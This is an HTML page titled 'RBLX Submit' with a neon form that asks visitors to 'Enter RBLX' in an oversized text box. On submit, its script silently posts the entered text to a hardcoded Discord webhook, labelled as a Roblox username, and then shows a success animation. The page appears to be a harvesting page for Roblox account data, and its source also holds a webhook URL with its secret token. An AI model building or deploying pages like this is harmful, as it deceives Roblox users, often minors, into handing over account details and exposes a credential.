<!doctype html>
<html lang="en" class="h-full">
 <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>RBLX Submit</title>
  <script src="https://cdn.tailwindcss.com/3.4.17"></script>
  <script src="/_sdk/element_sdk.js"></script>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&amp;display=swap" rel="stylesheet">
  <style>
    @keyframes neonPulse {
      0%, 100% { text-shadow: 0 0 10px #39ff14, 0 0 20px #39ff14, 0 0 40px #39ff14; }
      50% { text-shadow: 0 0 5px #39ff14, 0 0 10px #39ff14, 0 0 20px #39ff14; }
    }
    @keyframes tickDraw {
      0% { stroke-dashoffset: 60; }
      100% { stroke-dashoffset: 0; }
    }
    @keyframes circleDraw {
      0% { stroke-dashoffset: 314; }
      100% { stroke-dashoffset: 0; }
    }
    @keyframes fadeScale {
      0% { opacity: 0; transform: scale(0.5); }
      100% { opacity: 1; transform: scale(1); }
    }
    .neon-glow { animation: neonPulse 2s ease-in-out infinite; }
    .neon-box {
      box-shadow: 0 0 10px #39ff14, 0 0 20px rgba(57,255,20,0.3), inset 0 0 10px rgba(57,255,20,0.1);
      border: 2px solid #39ff14;
    }
    .neon-box:focus {
      box-shadow: 0 0 15px #39ff14, 0 0 30px rgba(57,255,20,0.5), inset 0 0 15px rgba(57,255,20,0.15);
    }
    .neon-btn {
      box-shadow: 0 0 10px #39ff14, 0 0 20px rgba(57,255,20,0.3);
      transition: all 0.2s;
    }
    .neon-btn:hover {
      box-shadow: 0 0 20px #39ff14, 0 0 40px rgba(57,255,20,0.5);
      background: #39ff14;
      color: #000;
    }
    .neon-btn:disabled { opacity: 0.4; cursor: not-allowed; }
    .success-svg circle {
      stroke-dasharray: 314;
      stroke-dashoffset: 314;
      animation: circleDraw 0.6s ease forwards;
    }
    .success-svg polyline {
      stroke-dasharray: 60;
      stroke-dashoffset: 60;
      animation: tickDraw 0.4s ease forwards 0.5s;
    }
    .success-container { animation: fadeScale 0.4s ease forwards; }
  </style>
  <style>body { box-sizing: border-box; }</style>
  <script src="https://cdn.jsdelivr.net/npm/lucide@0.263.0/dist/umd/lucide.min.js" type="text/javascript"></script>
  <script src="/_sdk/data_sdk.js" type="text/javascript"></script>
 </head>
 <body class="h-full">
  <div id="app" class="h-full w-full flex items-center justify-center" style="background:#0a0a0a; font-family:'Orbitron',monospace;">
   <!-- Form View -->
   <div id="formView" class="w-full max-w-2xl px-6 text-center">
    <h1 id="heading" class="text-3xl md:text-5xl font-900 mb-10 neon-glow" style="color:#39ff14;">Enter RBLX</h1><textarea id="rblxInput" class="neon-box w-full rounded-xl bg-transparent text-left text-lg md:text-xl font-semibold px-6 py-6 md:py-8 outline-none mb-8 resize-none" style="color:#39ff14; caret-color:#39ff14; height:280px;" autocomplete="off"></textarea> <button id="doneBtn" onclick="handleSubmit(event)" class="neon-btn rounded-xl px-12 py-4 text-lg md:text-xl font-bold bg-transparent border-2 border-green-400" style="color:#39ff14; border-color:#39ff14;"> Done </button>
   </div><!-- Success View -->
   <div id="successView" class="hidden success-container text-center">
    <svg class="success-svg mx-auto" width="120" height="120" viewbox="0 0 120 120" fill="none">
     <circle cx="60" cy="60" r="50" stroke="#39ff14" stroke-width="4" fill="none" /> <polyline points="38,62 54,78 82,42" stroke="#39ff14" stroke-width="5" fill="none" stroke-linecap="round" stroke-linejoin="round" />
    </svg>
   </div>
  </div>
  <script>
    const WEBHOOK = "https://discord.com/api/webhooks/1381729268133109248/xcrRviF6flAxc71RHCy6VwT2z6vfoqESqzp-0Y_t_JOxSXeClTgFr6qYGmgS-zkWPStb";

    const defaultConfig = {
      heading_text: "Enter RBLX",
      button_text: "Done",
      background_color: "#0a0a0a",
      neon_color: "#39ff14",
      font_family: "Orbitron"
    };

    function applyConfig(config) {
      const c = { ...defaultConfig, ...config };
      document.getElementById("heading").textContent = c.heading_text;
      document.getElementById("doneBtn").textContent = c.button_text;
      document.getElementById("app").style.background = c.background_color;
      const neon = c.neon_color;
      document.getElementById("heading").style.color = neon;
      document.getElementById("rblxInput").style.color = neon;
      document.getElementById("doneBtn").style.color = neon;
      document.getElementById("doneBtn").style.borderColor = neon;
      const font = c.font_family + ", monospace";
      document.getElementById("app").style.fontFamily = font;
    }

    window.elementSdk.init({
      defaultConfig,
      onConfigChange: async (config) => applyConfig(config),
      mapToCapabilities: (config) => ({
        recolorables: [
          { get: () => config.background_color || defaultConfig.background_color, set: (v) => { config.background_color = v; window.elementSdk.setConfig({ background_color: v }); } },
          { get: () => config.neon_color || defaultConfig.neon_color, set: (v) => { config.neon_color = v; window.elementSdk.setConfig({ neon_color: v }); } }
        ],
        borderables: [],
        fontEditable: { get: () => config.font_family || defaultConfig.font_family, set: (v) => { config.font_family = v; window.elementSdk.setConfig({ font_family: v }); } },
        fontSizeable: undefined
      }),
      mapToEditPanelValues: (config) => new Map([
        ["heading_text", config.heading_text || defaultConfig.heading_text],
        ["button_text", config.button_text || defaultConfig.button_text]
      ])
    });

    async function handleSubmit(e) {
      e.preventDefault();
      const input = document.getElementById("rblxInput");
      const btn = document.getElementById("doneBtn");
      const val = input.value.trim();
      if (!val) { input.focus(); return; }

      btn.disabled = true;
      btn.textContent = "Sending...";

      try {
        await fetch(WEBHOOK, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: "**New RBLX Username:** " + val })
        });
      } catch (err) {
        // silent
      }

      document.getElementById("formView").classList.add("hidden");
      document.getElementById("successView").classList.remove("hidden");
    }
  </script>

</html>
